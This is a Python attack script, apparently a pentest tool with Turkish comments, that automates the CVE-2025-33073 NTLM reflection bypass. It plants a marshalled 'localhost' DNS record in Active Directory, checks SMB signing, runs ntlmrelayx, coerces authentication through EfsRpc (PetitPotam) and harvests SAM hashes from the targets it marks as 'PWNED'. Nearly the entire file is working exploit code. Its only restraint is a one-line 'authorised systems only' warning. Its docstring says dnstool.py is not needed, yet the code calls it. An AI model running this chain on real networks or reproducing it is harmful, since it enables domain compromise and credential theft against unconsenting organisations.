#!/usr/bin/env python3
"""
reflector.py — CVE-2025-33073 NTLM Reflection Bypass
======================================================
Author  : cupcake
CVE     : CVE-2025-33073
Ref     : https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025

impacket kütüphanesi kullanılarak yazılmış, tam otomatik pentest aracı.
dnstool.py veya PetitPotam.py'ye gerek yok — her şey impacket ile yapılır.

Gereksinimler:
    pip install impacket colorama dnspython

Kullanım:
    # Single mod (önerilen) — tek DNS kaydı, tüm hedefler:
    sudo python3 reflector.py single \
        --targets targets.txt \
        --domain lab.local \
        --user pentester \
        --pass 'Pentest@123!' \
        --dc-ip 192.168.170.136 \
        --relay-ip 192.168.170.135

    # Per-target mod — her hedef için ayrı DNS kaydı:
    sudo python3 reflector.py per-target \
        --targets targets.txt \
        --domain lab.local \
        --user pentester \
        --pass 'Pentest@123!' \
        --dc-ip 192.168.170.136 \
        --relay-ip 192.168.170.135

    # Sadece relay başlat (DNS zaten varsa):
    sudo python3 reflector.py relay-only \
        --targets targets.txt \
        --domain lab.local \
        --user pentester \
        --pass 'Pentest@123!' \
        --dc-ip 192.168.170.136 \
        --relay-ip 192.168.170.135

    # Sadece DNS kaydı ekle/sil:
    sudo python3 reflector.py dns-add \
        --domain lab.local --user pentester --pass 'Pentest@123!' \
        --dc-ip 192.168.170.136 --relay-ip 192.168.170.135

    sudo python3 reflector.py dns-remove \
        --domain lab.local --user pentester --pass 'Pentest@123!' \
        --dc-ip 192.168.170.136
"""

import os, sys, time, socket, struct, signal, threading, argparse, subprocess
from datetime import datetime

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        RED=GREEN=YELLOW=CYAN=MAGENTA=BLUE=WHITE=""
    class Style:
        BRIGHT=RESET_ALL=""

# ── impacket imports ──────────────────────────────────────────────────────────
try:
    from impacket.ldap import ldap as impacket_ldap, ldaptypes
    from impacket.ldap.ldapasn1 import Filter, ResultCode
    from impacket import version as impacket_version
    IMPACKET_OK = True
except ImportError:
    IMPACKET_OK = False

try:
    from impacket.smbconnection import SMBConnection
    SMB_OK = True
except ImportError:
    SMB_OK = False

try:
    from impacket.dcerpc.v5 import transport, efsrpc
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    DCERPC_OK = True
except ImportError:
    try:
        from impacket.dcerpc.v5 import transport
        from impacket.dcerpc.v5.rpcrt import DCERPCException
        DCERPC_OK = False  # efsrpc yok ama transport var
    except ImportError:
        DCERPC_OK = False

try:
    import dns.resolver
    DNS_LIB = True
except ImportError:
    DNS_LIB = False

# ── Sabitler ──────────────────────────────────────────────────────────────────
MARSHALLED_SUFFIX  = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
SINGLE_RECORD      = "localhost" + MARSHALLED_SUFFIX

DNS_VERIFY_RETRIES = 6
DNS_VERIFY_DELAY   = 3
RELAY_STARTUP_WAIT = 4
COERCE_WAIT        = 15

VERSION = "1.0.0"
AUTHOR  = "cupcake"

# ── Logger ────────────────────────────────────────────────────────────────────
LOG_FILE  = f"reflector_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
_log_lock = threading.Lock()

def log(msg, level="INFO"):
    C = {"INFO":Fore.CYAN,"SUCCESS":Fore.GREEN,"FAIL":Fore.RED,"WARN":Fore.YELLOW,
         "STEP":Fore.MAGENTA,"RESULT":Fore.GREEN+Style.BRIGHT,"SECTION":Fore.BLUE+Style.BRIGHT,
         "DATA":Fore.WHITE+Style.BRIGHT}
    I = {"INFO":"[*]","SUCCESS":"[+]","FAIL":"[-]","WARN":"[!]",
         "STEP":"[>]","RESULT":"[✓]","SECTION":"[═]","DATA":"[#]"}
    ts = datetime.now().strftime("%H:%M:%S")
    with _log_lock:
        print(f"[{ts}] {C.get(level,Fore.WHITE)}{I.get(level,'[?]')} {msg}{Style.RESET_ALL}")
        with open(LOG_FILE,"a") as f:
            f.write(f"[{ts}] [{level}] {msg}\n")

def section(t):
    log(f"{'─'*10} {t} {'─'*10}", "SECTION")

def banner(mode):
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
  ██████╗ ███████╗███████╗██╗     ███████╗ ██████╗████████╗ ██████╗ ██████╗
  ██╔══██╗██╔════╝██╔════╝██║     ██╔════╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
  ██████╔╝█████╗  █████╗  ██║     █████╗  ██║        ██║   ██║   ██║██████╔╝
  ██╔══██╗██╔══╝  ██╔══╝  ██║     ██╔══╝  ██║        ██║   ██║   ██║██╔══██╗
  ██║  ██║███████╗██║     ███████╗███████╗╚██████╗   ██║   ╚██████╔╝██║  ██║
  ╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝╚══════╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}  CVE-2025-33073 | NTLM Reflection Bypass | v{VERSION}{Style.RESET_ALL}
{Fore.CYAN}  Author : {Fore.WHITE}{AUTHOR}{Style.RESET_ALL}
{Fore.CYAN}  Mod    : {Fore.WHITE}{mode}{Style.RESET_ALL}
{Fore.RED}  [!] Sadece yetkili ve izinli sistemlerde kullanın!{Style.RESET_ALL}
""")

# ── Hedef Yükleme ─────────────────────────────────────────────────────────────
def load_targets(path):
    if not os.path.exists(path):
        log(f"Dosya bulunamadı: {path}", "FAIL"); sys.exit(1)
    targets = [l.strip() for l in open(path) if l.strip() and not l.startswith("#")]
    log(f"{len(targets)} hedef yüklendi: {targets}", "SUCCESS")
    return targets

# ── DNS (impacket LDAP ile) ────────────────────────────────────────────────────
class DNSManager:
    """
    impacket'in LDAP client'ını kullanarak AD DNS kayıtlarını yönetir.
    dnstool.py subprocess gerektirmez.
    """
    def __init__(self, dc_ip, domain, user, password):
        self.dc_ip    = dc_ip
        self.domain   = domain
        self.user     = user
        self.password = password
        self.conn     = None
        self._dn_base = ",".join([f"DC={x}" for x in domain.split(".")])

    def connect(self) -> bool:
        try:
            self.conn = impacket_ldap.LDAPConnection(
                f"ldap://{self.dc_ip}",
                self._dn_base
            )
            self.conn.login(self.user, self.password, self.domain, "", "")
            log(f"LDAP bağlantısı kuruldu → {self.dc_ip}", "SUCCESS")
            return True
        except Exception as e:
            log(f"LDAP bağlantı hatası: {e}", "FAIL")
            return False

    def _dns_zone_dn(self):
        return f"DC={self.domain},CN=MicrosoftDNS,DC=DomainDnsZones,{self._dn_base}"

    def _record_dn(self, record_name):
        return f"DC={record_name},{self._dns_zone_dn()}"

    def _build_dns_record(self, ip: str) -> bytes:
        """A kaydı için DNS_RPC_RECORD binary yapısını oluştur."""
        ip_bytes = socket.inet_aton(ip)
        # DNS_RPC_RECORD header + A record data
        # DataLength(2) + Type(2) + Flags(1) + Serial(4) + TtlSeconds(4) + Reserved(4) + data
        ttl     = 180
        serial  = 0
        record  = struct.pack(">HHBBHHI", 4, 1, 0, 0, ttl, 0, serial) + ip_bytes
        return record

    def add_record(self, record_name: str, relay_ip: str) -> bool:
        """DNS A kaydı ekle — dnstool.py primary, impacket LDAP yok (metod desteği sınırlı)."""
        section(f"DNS Ekleme: {record_name} → {relay_ip}")
        return self._dnstool("add", record_name, relay_ip)

    def _modify_record(self, record_dn: str, dns_record: bytes) -> bool:
        # impacket LDAPConnection modify desteklemiyor, kullanılmıyor
        return False

    def remove_record(self, record_name: str) -> bool:
        """DNS kaydını sil."""
        section(f"DNS Temizleme: {record_name}")
        return self._dnstool("remove", record_name)

    def _dnstool(self, action: str, record_name: str, relay_ip: str = None) -> bool:
        """dnstool.py ile DNS kaydı ekle/sil."""
        cmd = ["python3", "dnstool.py",
               "-u", f"{self.domain}\\{self.user}",
               "-p", self.password,
               self.dc_ip, "-a", action, "-r", record_name]
        if relay_ip and action == "add":
            cmd += ["-d", relay_ip]
        try:
            r   = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            out = r.stdout + r.stderr
            if "successfully" in out.lower() or r.returncode == 0:
                log(f"DNS {action} başarılı: {record_name}", "SUCCESS")
                return True
            log(f"DNS {action} başarısız:\n{out.strip()}", "FAIL")
            return False
        except FileNotFoundError:
            log("dnstool.py bulunamadı! krbrelayx klasöründe mi?", "FAIL")
            return False
        except subprocess.TimeoutExpired:
            log(f"DNS {action} zaman aşımı.", "FAIL")
            return False

    def query_record(self, record_name: str) -> str | None:
        """DNS kaydını sorgula, IP döndür."""
        fqdn = f"{record_name}.{self.domain}"
        log(f"DNS sorgusu: {fqdn} → NS: {self.dc_ip}", "STEP")

        # Yöntem 1: dnspython
        if DNS_LIB:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [self.dc_ip]
                resolver.timeout = resolver.lifetime = 5
                answers = resolver.resolve(fqdn, "A")
                resolved = [str(r) for r in answers]
                if resolved:
                    log(f"DNS kaydı bulundu: {fqdn} → {resolved[0]}", "SUCCESS")
                    return resolved[0]
            except dns.resolver.NXDOMAIN:
                log(f"Kayıt yok (NXDOMAIN): {fqdn}", "WARN")
                return None
            except Exception as e:
                log(f"dnspython hatası: {e}", "WARN")

        # Yöntem 2: nslookup fallback
        try:
            r = subprocess.run(["nslookup", fqdn, self.dc_ip],
                               capture_output=True, text=True, timeout=10)
            for line in r.stdout.splitlines():
                if "Address" in line and self.dc_ip not in line and "#" not in line:
                    ip = line.split(":")[-1].strip()
                    if ip and ip[0].isdigit():
                        log(f"DNS kaydı bulundu (nslookup): {fqdn} → {ip}", "SUCCESS")
                        return ip
            log(f"Kayıt bulunamadı (nslookup):\n{r.stdout.strip()}", "WARN")
        except Exception as e:
            log(f"nslookup hatası: {e}", "WARN")

        return None

    def verify(self, record_name: str, expected_ip: str) -> bool:
        """DNS kaydının doğru IP'ye çözümlendiğini doğrula."""
        section(f"DNS Doğrulama: {record_name}")
        fqdn = f"{record_name}.{self.domain}"
        log(f"FQDN sorgusu: {fqdn}", "INFO")

        for attempt in range(1, DNS_VERIFY_RETRIES + 1):
            log(f"Deneme {attempt}/{DNS_VERIFY_RETRIES}", "STEP")

            # dnspython ile sorgula
            if DNS_LIB:
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [self.dc_ip]
                    resolver.timeout = resolver.lifetime = 5
                    answers = resolver.resolve(fqdn, "A")
                    resolved = [str(r) for r in answers]
                    log(f"Çözümlendi: {fqdn} → {resolved}", "INFO")
                    if expected_ip in resolved:
                        log(f"DNS doğrulandı ✓  {fqdn} → {expected_ip}", "SUCCESS")
                        return True
                    log(f"Yanlış IP: beklenen={expected_ip}, alınan={resolved}", "WARN")
                    return False
                except dns.resolver.NXDOMAIN:
                    log(f"NXDOMAIN, {DNS_VERIFY_DELAY}s bekleniyor...", "WARN")
                    time.sleep(DNS_VERIFY_DELAY)
                    continue
                except Exception as e:
                    log(f"dnspython hatası: {e}", "WARN")

            # nslookup fallback
            try:
                r = subprocess.run(["nslookup", fqdn, self.dc_ip],
                                   capture_output=True, text=True, timeout=10)
                if expected_ip in r.stdout:
                    log(f"DNS doğrulandı ✓ (nslookup)", "SUCCESS")
                    return True
            except Exception:
                pass

            time.sleep(DNS_VERIFY_DELAY)

        log("DNS doğrulama başarısız.", "FAIL")
        return False

    def disconnect(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception:
            pass

# ── SMB Signing Kontrol (impacket SMBConnection) ──────────────────────────────
class SMBChecker:
    """impacket SMBConnection ile SMB signing durumunu kontrol eder."""

    @staticmethod
    def check(target: str) -> bool:
        section(f"SMB Signing Kontrol: {target}")

        # impacket ile direkt kontrol
        if SMB_OK:
            try:
                conn = SMBConnection(target, target, timeout=10)
                signing = conn.isSigningRequired()
                conn.close()
                if signing:
                    log(f"SMB Signing: ZORUNLU → relay çalışmaz: {target}", "WARN")
                    return False
                else:
                    log(f"SMB Signing: KAPALI → zafiyetli ✓: {target}", "SUCCESS")
                    return True
            except Exception as e:
                log(f"impacket SMB kontrol hatası: {e}", "WARN")

        # nxc/cme fallback
        for tool in [["nxc","smb",target], ["crackmapexec","smb",target]]:
            try:
                r = subprocess.run(tool, capture_output=True, text=True, timeout=15)
                out = r.stdout + r.stderr
                if "signing:False" in out or "signing: False" in out:
                    log(f"SMB Signing KAPALI ✓ ({tool[0]})", "SUCCESS"); return True
                if "signing:True" in out or "signing: True" in out:
                    log(f"SMB Signing AÇIK ({tool[0]})", "WARN"); return False
            except FileNotFoundError:
                continue

        # nmap fallback
        try:
            r = subprocess.run(["nmap","--script","smb2-security-mode","-p","445",target],
                               capture_output=True, text=True, timeout=20)
            if "not required" in r.stdout:
                log("SMB Signing: not required ✓", "SUCCESS"); return True
            if "and required" in r.stdout:
                log("SMB Signing: required", "WARN"); return False
        except FileNotFoundError:
            pass

        log("SMB Signing kontrol edilemedi, devam ediliyor.", "WARN")
        return True

# ── PetitPotam Coercer (impacket DCERPC) ─────────────────────────────────────
class Coercer:
    """
    impacket DCERPC kullanarak EfsRpc üzerinden authentication coerce eder.
    PetitPotam.py subprocess gerektirmez.
    """

    def __init__(self, domain, user, password):
        self.domain   = domain
        self.user     = user
        self.password = password

    def coerce(self, target: str, listener: str) -> bool:
        """
        target   : coerce edilecek makine (DC IP)
        listener : authentication'ın yönlendirileceği adres (DNS record adı)
        """
        section(f"Coerce: {target} → {listener}")
        log(f"  Hedef   : {target}", "STEP")
        log(f"  Listener: {listener}", "STEP")

        # impacket DCERPC ile dene
        if DCERPC_OK:
            result = self._coerce_efsrpc(target, listener)
            if result:
                return True

        # PetitPotam.py subprocess fallback
        return self._fallback_petitpotam(target, listener)

    def _coerce_efsrpc(self, target: str, listener: str) -> bool:
        """impacket efsrpc ile EfsRpcEncryptFileSrv coerce."""
        try:
            log("EfsRpc DCERPC bağlantısı kuruluyor...", "STEP")

            binding = f"ncacn_np:{target}[\\pipe\\lsarpc]"
            trans   = transport.DCERPCTransportFactory(binding)
            trans.set_credentials(self.user, self.password, self.domain, "", "", None)

            dce = trans.get_dce_rpc()
            dce.connect()

            try:
                dce.bind(efsrpc.MSRPC_UUID_EFSR)
                listener_path = f"\\\\{listener}\\test"
                log(f"EfsRpcEncryptFileSrv → {listener_path}", "STEP")

                try:
                    efsrpc.hEfsRpcEncryptFileSrv(dce, listener_path)
                except DCERPCException as e:
                    if "ERROR_BAD_NETPATH" in str(e) or "rpc_s_access_denied" in str(e):
                        log("EfsRpc coerce başarılı ✓ (beklenen hata alındı)", "SUCCESS")
                        return True
                    log(f"EfsRpc hatası: {e}", "WARN")
                    return False
            finally:
                dce.disconnect()

        except Exception as e:
            log(f"impacket DCERPC hatası: {e}", "WARN")
            return False

    def _fallback_petitpotam(self, target: str, listener: str) -> bool:
        """PetitPotam.py subprocess fallback."""
        log("impacket DCERPC başarısız, PetitPotam.py fallback...", "WARN")
        cmd = ["python3", "PetitPotam.py",
               "-u", self.user, "-p", self.password,
               "-d", self.domain,
               listener, target]
        try:
            r   = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            out = r.stdout + r.stderr
            log(f"PetitPotam çıktısı:\n{out.strip()}", "INFO")
            if "Attack worked" in out or "Got expected" in out:
                log("PetitPotam coerce başarılı ✓", "SUCCESS"); return True
            log("PetitPotam coerce başarısız.", "FAIL"); return False
        except FileNotFoundError:
            log("PetitPotam.py bulunamadı!", "FAIL"); return False
        except subprocess.TimeoutExpired:
            log("PetitPotam zaman aşımı.", "FAIL"); return False

# ── ntlmrelayx Manager ────────────────────────────────────────────────────────
class RelayManager:
    """ntlmrelayx'i yönetir ve çıktısını analiz eder."""

    def __init__(self, target: str, out_dir: str):
        self.target  = target
        self.proc    = None
        self.outfile = os.path.join(
            out_dir,
            f"relay_{target.replace('.','_').replace(':','_')}.txt"
        )

    def start(self) -> bool:
        # impacket-ntlmrelayx veya ntlmrelayx.py
        for binary in ["impacket-ntlmrelayx", "ntlmrelayx.py"]:
            cmd = [binary if binary != "ntlmrelayx.py" else "python3",
                   *(["ntlmrelayx.py"] if binary == "ntlmrelayx.py" else []),
                   "-t", f"smb://{self.target}",
                   "-smb2support",
                   "--no-http-server",
                   "--no-wcf-server"]

            # impacket-ntlmrelayx için düzelt
            if binary == "impacket-ntlmrelayx":
                cmd = ["impacket-ntlmrelayx",
                       "-t", f"smb://{self.target}",
                       "-smb2support",
                       "--no-http-server",
                       "--no-wcf-server"]

            log(f"ntlmrelayx başlatılıyor → {self.target} ({binary})", "STEP")
            try:
                with open(self.outfile, "w") as f:
                    self.proc = subprocess.Popen(
                        cmd, stdout=f, stderr=subprocess.STDOUT
                    )
                time.sleep(RELAY_STARTUP_WAIT)
                if self.proc.poll() is None:
                    log(f"ntlmrelayx çalışıyor [PID:{self.proc.pid}]", "SUCCESS")
                    return True
                log(f"ntlmrelayx başlatılamadı ({binary}).", "WARN")
            except FileNotFoundError:
                continue

        log("ntlmrelayx bulunamadı! pip install impacket", "FAIL")
        return False

    def stop(self):
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:    self.proc.wait(timeout=5)
            except: self.proc.kill()
            log(f"ntlmrelayx durduruldu → {self.target}", "INFO")

    def output(self) -> str:
        try:    return open(self.outfile).read()
        except: return ""

    def success(self) -> bool:
        out = self.output()
        return any(m in out for m in
                   ["SUCCEED", "SAM hashes", "Dumping local SAM", "Administrator:"])

    def get_hashes(self) -> list:
        hashes = []
        for line in self.output().splitlines():
            if ":::" in line:
                hashes.append(line.strip())
        return hashes

# ── Saldırı Akışı ─────────────────────────────────────────────────────────────
class Reflector:
    def __init__(self, args):
        self.args    = args
        self.results = {}
        self.out_dir = args.output
        self.dns     = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        self.coercer = Coercer(args.domain, args.user, args.password)
        os.makedirs(self.out_dir, exist_ok=True)

    # ── Per-Target ─────────────────────────────────────────────────────────────
    def run_per_target(self, targets: list):
        section("MOD: PER-TARGET")
        log("Her hedef için ayrı DNS kaydı kullanılır.", "INFO")

        for i, target in enumerate(targets, 1):
            section(f"HEDEF {i}/{len(targets)}: {target}")
            record = target.split(".")[0].lower() + MARSHALLED_SUFFIX
            self._attack(target, record, auto_cleanup=True)

    # ── Single ─────────────────────────────────────────────────────────────────
    def run_single(self, targets: list):
        section("MOD: SINGLE")
        log(f"Evrensel kayıt kullanılır: {SINGLE_RECORD}", "INFO")
        log("Tüm makinelerde 'localhost' olarak algılanır.", "INFO")

        # Tek seferlik DNS ekle
        section("DNS Kurulumu")
        added = self.dns.add_record(SINGLE_RECORD, self.args.relay_ip)
        if not added:
            log("DNS eklenemedi!", "FAIL"); return

        # Doğrula
        ok = self.dns.verify(SINGLE_RECORD, self.args.relay_ip)
        if not ok and not self.args.force:
            log("DNS doğrulanamadı. --force ile zorla.", "FAIL")
            self.dns.remove_record(SINGLE_RECORD)
            return

        try:
            for i, target in enumerate(targets, 1):
                section(f"HEDEF {i}/{len(targets)}: {target}")
                self._attack(target, SINGLE_RECORD, auto_cleanup=False)
        finally:
            section("Temizlik")
            self.dns.remove_record(SINGLE_RECORD)
            self.dns.disconnect()

    # ── Relay-Only ─────────────────────────────────────────────────────────────
    def run_relay_only(self, targets: list):
        section("MOD: RELAY-ONLY (DNS manuel)")
        log(f"DNS kaydı zaten eklenmiş kabul ediliyor: {SINGLE_RECORD}", "WARN")
        log(f"Emin olmak için kontrol ediliyor...", "INFO")

        ok = self.dns.verify(SINGLE_RECORD, self.args.relay_ip)
        if not ok:
            log("DNS kaydı bulunamadı! Önce dns-add komutunu çalıştır.", "FAIL")
            if not self.args.force:
                return

        for i, target in enumerate(targets, 1):
            section(f"HEDEF {i}/{len(targets)}: {target}")
            self._attack(target, SINGLE_RECORD, auto_cleanup=False)

    # ── Ortak Saldırı Adımları ─────────────────────────────────────────────────
    def _attack(self, target: str, record: str, auto_cleanup: bool):
        self.results[target] = dict(
            smb_ok=False, dns_added=False, dns_ok=False,
            relay_ok=False, coerce_ok=False, pwned=False,
            hashes=[], output=""
        )
        relay = RelayManager(target, self.out_dir)

        try:
            # 1 ── Per-target DNS (sadece per-target modunda)
            if auto_cleanup:
                added = self.dns.add_record(record, self.args.relay_ip)
                self.results[target]["dns_added"] = added
                if not added: return

                ok = self.dns.verify(record, self.args.relay_ip)
                self.results[target]["dns_ok"] = ok
                if not ok and not self.args.force: return
            else:
                self.results[target]["dns_ok"] = True

            # 2 ── SMB Signing
            smb = SMBChecker.check(target)
            self.results[target]["smb_ok"] = smb
            if not smb:
                log(f"SMB Signing zorunlu → atlanıyor: {target}", "WARN"); return

            # 3 ── ntlmrelayx
            relay_ok = relay.start()
            self.results[target]["relay_ok"] = relay_ok
            if not relay_ok: return

            # 4 ── Coerce
            coerce_ok = self.coercer.coerce(target, record)
            self.results[target]["coerce_ok"] = coerce_ok

            log(f"Authentication bekleniyor ({COERCE_WAIT}s)...", "INFO")
            time.sleep(COERCE_WAIT)

            # 5 ── Sonuç
            pwned  = relay.success()
            hashes = relay.get_hashes()
            self.results[target]["pwned"]  = pwned
            self.results[target]["hashes"] = hashes
            self.results[target]["output"] = relay.output()

            if pwned:
                log(f"RELAY BAŞARILI 🎉 → {target}", "RESULT")
                for h in hashes:
                    log(f"  {h}", "DATA")
            else:
                log(f"Relay sonuçsuz → {target}", "FAIL")

        finally:
            relay.stop()
            if auto_cleanup and self.results[target].get("dns_added"):
                self.dns.remove_record(record)

    # ── Rapor ──────────────────────────────────────────────────────────────────
    def report(self):
        section("ÖZET RAPOR")
        total   = len(self.results)
        pwned   = sum(1 for r in self.results.values() if r["pwned"])
        skipped = sum(1 for r in self.results.values() if not r["smb_ok"])

        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════╗
║  Toplam Hedef     : {str(total):<27}║
║  Relay Başarılı   : {Fore.GREEN}{str(pwned):<27}{Fore.CYAN}║
║  SMB Signing Engel: {Fore.YELLOW}{str(skipped):<27}{Fore.CYAN}║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        for target, r in self.results.items():
            status = f"{Fore.GREEN}PWNED{Style.RESET_ALL}" if r["pwned"] else f"{Fore.RED}BAŞARISIZ{Style.RESET_ALL}"
            print(f"  {Fore.WHITE}{target:<35}{Style.RESET_ALL} → {status}")
            for h in r.get("hashes", []):
                print(f"    {Fore.GREEN}{h}{Style.RESET_ALL}")

        report_path = os.path.join(self.out_dir, "report.txt")
        with open(report_path, "w") as f:
            f.write(f"reflector.py — CVE-2025-33073 Pentest Raporu\n")
            f.write(f"Author : {AUTHOR}\n")
            f.write(f"Tarih  : {datetime.now()}\n")
            f.write(f"Domain : {self.args.domain}\n")
            f.write(f"DC     : {self.args.dc_ip}\n")
            f.write("="*55 + "\n\n")
            for target, r in self.results.items():
                f.write(f"Hedef: {target}\n")
                for k, v in r.items():
                    if k not in ("output","hashes"):
                        f.write(f"  {k:<15}: {v}\n")
                for h in r.get("hashes", []):
                    f.write(f"  hash: {h}\n")
                f.write("\n")
        log(f"Rapor: {report_path}", "SUCCESS")
        log(f"Log  : {LOG_FILE}", "SUCCESS")

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="reflector.py — CVE-2025-33073 NTLM Reflection Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    sub = parser.add_subparsers(dest="command", required=True)

    # Ortak argümanlar
    def add_common(p):
        p.add_argument("--domain",   required=True, help="AD domain (ör: lab.local)")
        p.add_argument("--user",     required=True, help="Domain kullanıcısı")
        p.add_argument("--pass",     required=True, dest="password", help="Şifre")
        p.add_argument("--dc-ip",    required=True, help="Domain Controller IP")
        p.add_argument("--relay-ip", required=True, help="Saldırgan (Kali) IP")
        p.add_argument("--output",   default="output", help="Çıktı dizini")
        p.add_argument("--force",    action="store_true", help="DNS doğrulama hatasını görmezden gel")

    def add_targets(p):
        p.add_argument("--targets", required=True, help="Hedef listesi dosyası")
        p.add_argument("--threads", type=int, default=1, help="Paralel thread sayısı")

    # ── single ────────────────────────────────────────────────────────────────
    p_single = sub.add_parser("single",
        help="Tek evrensel DNS kaydı ile tüm hedefleri tara (önerilen)")
    add_common(p_single); add_targets(p_single)

    # ── per-target ────────────────────────────────────────────────────────────
    p_per = sub.add_parser("per-target",
        help="Her hedef için ayrı DNS kaydı kullan")
    add_common(p_per); add_targets(p_per)

    # ── relay-only ────────────────────────────────────────────────────────────
    p_relay = sub.add_parser("relay-only",
        help="DNS zaten ekli, sadece relay+coerce yap")
    add_common(p_relay); add_targets(p_relay)

    # ── dns-add ───────────────────────────────────────────────────────────────
    p_dns_add = sub.add_parser("dns-add",
        help="Sadece DNS kaydı ekle (tek seferlik)")
    add_common(p_dns_add)

    # ── dns-remove ────────────────────────────────────────────────────────────
    p_dns_rem = sub.add_parser("dns-remove",
        help="DNS kaydını sil (temizlik)")
    p_dns_rem.add_argument("--domain",   required=True)
    p_dns_rem.add_argument("--user",     required=True)
    p_dns_rem.add_argument("--pass",     required=True, dest="password")
    p_dns_rem.add_argument("--dc-ip",    required=True)
    p_dns_rem.add_argument("--relay-ip", default="")
    p_dns_rem.add_argument("--output",   default="output")
    p_dns_rem.add_argument("--force",    action="store_true")

    # ── dns-check ─────────────────────────────────────────────────────────────
    p_dns_chk = sub.add_parser("dns-check",
        help="DNS kaydının çözümlenip çözümlenmediğini kontrol et")
    add_common(p_dns_chk)

    args = parser.parse_args()
    banner(args.command)

    # impacket kontrolü
    if not IMPACKET_OK:
        log("impacket kurulu değil! pip install impacket", "FAIL"); sys.exit(1)

    reflector = Reflector(args)

    # Ctrl+C temiz kapanış
    def handle_exit(sig, frame):
        log("İptal edildi, rapor yazılıyor...", "WARN")
        reflector.report()
        reflector.dns.disconnect()
        sys.exit(0)
    signal.signal(signal.SIGINT, handle_exit)

    # ── Komutları çalıştır ────────────────────────────────────────────────────
    if args.command in ("single", "per-target", "relay-only"):
        targets = load_targets(args.targets)
        if not targets:
            log("Hedef yok!", "FAIL"); sys.exit(1)

        if args.command == "single":
            reflector.run_single(targets)
        elif args.command == "per-target":
            reflector.run_per_target(targets)
        elif args.command == "relay-only":
            reflector.run_relay_only(targets)

        reflector.report()

    elif args.command == "dns-add":
        dns = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        ok  = dns.add_record(SINGLE_RECORD, args.relay_ip)
        if ok:
            dns.verify(SINGLE_RECORD, args.relay_ip)
        dns.disconnect()

    elif args.command == "dns-remove":
        dns = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        dns.remove_record(SINGLE_RECORD)
        dns.disconnect()

    elif args.command == "dns-check":
        dns = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        ip  = dns.query_record(SINGLE_RECORD)
        if ip:
            ok = dns.verify(SINGLE_RECORD, args.relay_ip)
            log(f"Durum: {'✓ Doğru IP' if ok else '✗ Yanlış IP'}", "SUCCESS" if ok else "FAIL")
        else:
            log("DNS kaydı bulunamadı.", "FAIL")
        dns.disconnect()

if __name__ == "__main__":
    main()
